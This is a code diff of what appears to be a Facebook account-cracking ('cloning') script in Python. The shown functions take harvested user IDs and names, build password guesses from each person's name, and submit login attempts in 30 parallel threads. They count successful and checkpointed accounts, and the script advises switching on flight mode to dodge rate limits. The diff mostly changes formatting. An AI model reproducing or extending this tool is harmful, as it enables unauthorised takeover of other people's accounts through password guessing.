@@ -576,23 +576,9 @@ def crackfile():
 
         setting()
 
+
 #-------------[ PENGATURAN-IDZ ]---------------#
-import os
-import random
-import time
-from concurrent.futures import ThreadPoolExecutor as tred
-
-id = []  # Assuming this is defined elsewhere in your code
-id2 = []  # Assuming this is defined elsewhere in your code
-ok = 0  # Placeholder for the actual implementation
-cp = 0  # Placeholder for the actual implementation
-tag = ""  # Placeholder for the actual implementation
-pwnya = []  # Placeholder for the actual implementation
-pwpluss = ""  # Placeholder for the actual implementation
-method = []  # Placeholder for the actual implementation
-logo = ""  # Placeholder for the actual implementation
-
-# Function to handle user input and initiate password cracking
+ 
 def setting():
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
@@ -600,26 +586,26 @@ def setting():
     print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
     print('\033[0;97m-----------------------------------------------')
     hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
-    if hu in ['1', '01']:
+    if hu in ['1','01']:
         for tua in sorted(id):
             id2.append(tua)
-    elif hu in ['2', '02']:
-        muda = []
+    elif hu in ['2','02']:
+        muda=[] 
         for bacot in sorted(id):
             muda.append(bacot)
-        bcm = len(muda)
-        bcmi = (bcm - 1)
+        bcm=len(muda)
+        bcmi=(bcm-1)
         for xmud in range(bcm):
             id2.append(muda[bcmi])
-            bcmi -= 1
-    elif hu in ['3', '03']:
+            bcmi -=1
+    elif hu in ['3','03']:
         for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
+            xx = random.randint(0,len(id2))
+            id2.insert(xx,bacot)
     else:
         for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
+            xx = random.randint(0,len(id2))
+            id2.insert(xx,bacot)
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
     print('\033[0;97m-----------------------------------------------')
@@ -627,30 +613,35 @@ def setting():
     print(" [\u001b[36m2\033[1;37m] METHOD 2")
     print('\033[0;97m-----------------------------------------------')
     hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
-    print('\033[0;97m-----------------------------------------------')
-    if hc in ['1', '01']:
+    print('\033[0;97m-----------------------------------------------')                              
+    if hc in ['1','01']:
         method.append('mobile')
-    elif hc in ['2', '02']:
+    elif hc in ['2','02']:
         method.append('free')
     else:
         method.append('mobile')
     print(' [\u001b[36m•\033[1;37m] DO YOU WANT TO SHOW CP IDZ? (Y/N) ')
-    print('\033[0;97m-----------------------------------------------')
+    print('\033[0;97m-----------------------------------------------')       
     bau = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     passwrd()
-
+    exit() 
+ 
 #-------------------[ BAGIAN-WORDLIST ]------------#
+# Define the banner function
+def banner():
+    # Your implementation of the banner function
+    pass  # Placeholder for the actual implementation
 
-# Function to handle password cracking process
+# Define the passwrd function
 def passwrd():
     os.system('clear')
     print(logo)
-    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : " + time.strftime("%H:%M") + " " + tag)
+    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
     print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
     print('\033[0;97m-----------------------------------------------')
     print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
     print('\033[0;97m-----------------------------------------------')
-
+    
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
@@ -660,7 +651,7 @@ def passwrd():
                 lst = nmf.split(' ')[1]
             except:
                 lst = ''
-
+                
             if len(nmf) < 6:
                 if len(frs) < 3:
                     pass
@@ -713,7 +704,7 @@ def passwrd():
                     pwv.append(xpwd)
             else:
                 pass
-
+            
             if 'mobile' in method:
                 pool.submit(crack, idf, pwv)
             elif 'free' in method:
@@ -724,17 +715,17 @@ def passwrd():
                 pool.submit(crackfree, idf, pwv)
             else:
                 pool.submit(crackfree, idf, pwv)
-
+    
     print('\033[0;91m-----------------------------------------------')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' + time.strftime(
-        "%H:%M") + " " + tag)
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s ' % (ok))
-    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s ' % (cp))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\033[0;91m-----------------------------------------------')
-
+    
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
     os.system("python TOXIC.py")
     exit()
+
 
 #--------------------[ METODE-B-API ]-----------------#
  
